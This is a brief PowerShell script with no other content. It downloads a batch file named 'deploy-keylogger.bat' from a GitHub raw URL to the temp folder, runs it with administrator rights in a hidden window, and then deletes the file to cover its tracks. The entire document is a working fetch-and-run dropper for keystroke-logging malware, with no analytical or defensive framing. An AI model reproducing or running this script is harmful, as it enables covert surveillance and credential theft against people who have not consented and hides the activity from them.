$url="https://raw.githubusercontent.com/Zhuss1/main/main/deploy-keylogger.bat"
$bat="$env:TEMP\kl.bat"
iwr $url -OutFile $bat -UseBasicParsing
Start-Process cmd -ArgumentList "/c `"$bat`"" -WindowStyle Hidden -Verb RunAs
Start-Sleep 5
Remove-Item $bat -ErrorAction SilentlyContinue
